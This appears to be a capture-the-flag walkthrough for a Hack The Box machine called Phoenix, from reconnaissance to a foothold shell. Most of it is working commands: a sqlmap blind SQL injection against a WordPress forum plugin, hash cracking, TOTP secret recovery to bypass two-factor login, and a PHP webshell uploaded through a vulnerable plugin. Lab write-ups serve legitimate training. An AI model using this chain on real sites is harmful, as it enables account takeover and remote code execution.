## Overview

Phoenix is a hard-difficulty Linux box built around a hardened WordPress install. The site sits behind HTTPS, hides `wp-admin` behind a custom login form with a captcha, and wraps the administrator account in TOTP two-factor authentication. The foothold chain defeats all three: an outdated forum plugin yields an unauthenticated blind SQL injection that dumps the admin hash *and* the 2FA secret, letting us mint our own one-time codes and log in, after which a vulnerable upload plugin gives code execution. This post covers recon through the foothold shell.

Named CVE-2022-0381 unauth blind SQLi is the core foothold, leaking the admin hash and the miniorange 2FA secret so the TOTP is decrypted and regenerated, then an upload plugin gives RCE.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH 8.2p1 (Ubuntu) | login restricted |
| 80   | Apache (HTTP) | redirects to `https://phoenix.htb/` |
| 443  | Apache (HTTPS) | WordPress 5.9, `robots.txt` → `/wp-admin/` |

```bash
nmap -sC -sV 10.129.7.196
echo "10.129.7.196 phoenix.htb" | sudo tee -a /etc/hosts
```

The TLS certificate (`organizationName=Phoenix Security Ltd.`) and the `robots.txt` disallow on `/wp-admin/` confirm a WordPress site. Everything interesting lives on 443.

## Enumeration

Pulling the homepage source exposes the active plugins via their asset URLs:

```bash
curl -sk https://phoenix.htb/ | grep -oE 'wp-content/plugins/[^/]+'
```

The standout is **Asgaros Forum 1.15.12** — a version one release behind the fix for **CVE-2022-0381**, an unauthenticated blind time-based SQL injection in the `subscribe_topic` parameter. The forum endpoint is live at `/forum/`, so the injection point is reachable without any credentials.

## Foothold

### 1 — Dump the admin hash and 2FA secret (CVE-2022-0381)

Because the injection returns no output, it is exploited blind/time-based. Rather than dumping everything (painfully slow), target only the rows needed: the administrator's password hash, and the miniorange two-factor plugin's stored TOTP secret plus the key used to encrypt it.

```bash
# admin password hash
sqlmap --url "https://phoenix.htb/forum/?subscribe_topic=*" --keep-alive --dbms=mysql \
  --risk 3 --technique=TB --threads=5 --random-agent --level 3 \
  -D wordpress -T wp_users --sql-query="select user_login,user_pass from wp_users where ID=1" --batch

# miniorange 2FA secret + its decryption key (wp_usermeta)
sqlmap --url "https://phoenix.htb/forum/?subscribe_topic=*" --keep-alive --dbms=mysql \
  --risk 3 --technique=TB --level 3 -D wordpress -T wp_usermeta \
  --sql-query="select meta_value from wp_usermeta where meta_key='mo2f_gauth_key'" --hex
```

Crack the phpass (`$P$`) hash offline:

```bash
# requires: /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash    # -> <redacted>
```

The miniorange plugin stores both the encrypted secret (`mo2f_gauth_key`) and the encryption key (`mo2f_get_auth_rnd_string`) in the same database — so dumping both and running them through the plugin's own decryption routine recovers a plain base32 TOTP seed.

### 2 — Defeat the 2FA

With the seed, generate a valid 6-digit code on demand (no `oathtool` needed):

```bash
python3 -c "import base64,hmac,hashlib,struct,time;s='<base32_secret>';k=base64.b32decode(s+'='*((8-len(s)%8)%8));h=hmac.new(k,struct.pack('>Q',int(time.time())//30),hashlib.sha1).digest();o=h[-1]&0xf;print('%06d'%((struct.unpack('>I',h[o:o+4])[0]&0x7fffffff)%1000000))"
```

Log in through the custom pie-register form (solving its math captcha), then submit the OTP. The validation runs over AJAX, not the visible form — posting the soft-token straight to `admin-ajax.php` returns a success JSON and sets the `wordpress_logged_in` cookie:

```bash
curl -sk "https://phoenix.htb/wp-admin/admin-ajax.php" -b /tmp/wp.cookies -c /tmp/wp.cookies \
  --data 'action=mo2f_ajax&mo2f_ajax_option=mo2f_ajax_otp&request_origin_method=MO_2_FACTOR_CHALLENGE_GOOGLE_AUTHENTICATOR' \
  --data-urlencode 'mo2fa_softtoken=<totp>' --data-urlencode 'miniorange_soft_token_nonce=<nonce>' \
  --data-urlencode 'session_id=<session_id>'
# {"success":true,"data":{"redirect":"https:\/\/phoenix.htb\/wp-admin\/"}}
```

We are now authenticated as the WordPress administrator.

### 3 — RCE via the Download From Files plugin (EDB 50287)

The admin panel exposes the **Download From Files** plugin (≤ 1.48), whose upload AJAX trusts a client-supplied extension allowlist. Send a `.phtml` webshell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.phtml
curl -sk "https://phoenix.htb/wp-admin/admin-ajax.php?action=download_from_files_617_fileupload" \
  -b /tmp/wp.cookies \
  -F 'files[]=@shell.phtml;type=application/octet-stream' \
  -F 'allowExt=php4,phtml' -F 'filesName=files' -F 'maxSize=1000' -F 'uploadDir=.'
# {"status":1,"message":"Sikeres a fájl(ok) másolása."}

curl -sk "https://phoenix.htb/wp-admin/shell.phtml?cmd=id"
# uid=1001(wp_user) gid=1001(wp_user) groups=1001(wp_user)
```

Command execution as `wp_user` — foothold landed.

## User flag

```bash
curl -sk "https://phoenix.htb/wp-admin/shell.phtml?cmd=cat+/home/*/user.txt"   # HTB{...}
```

The webshell gives a reliable RCE foothold as `wp_user`; the user flag itself lives on a separate account reached through internal pivoting.

Lateral movement and privilege escalation are left as an exercise — this post stops at the foothold shell.
